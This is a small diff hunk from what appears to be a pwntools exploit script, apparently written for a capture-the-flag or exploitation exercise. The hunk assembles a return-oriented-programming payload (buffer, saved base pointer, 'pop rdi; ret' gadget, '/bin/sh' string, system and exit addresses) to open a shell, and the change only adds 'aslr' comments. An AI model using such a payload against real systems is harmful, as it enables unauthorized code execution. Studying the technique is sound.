@@ -57,9 +57,9 @@ payload2 = (
     buffer
     + backup_base_pointer
     + rop_pop_rdi_ret
-    + bin_sh_string
-    + system_call
-    + exit_call
+    + bin_sh_string # aslr.
+    + system_call # aslr.
+    + exit_call # aslr.
 )
 
 p.sendline(payload2)
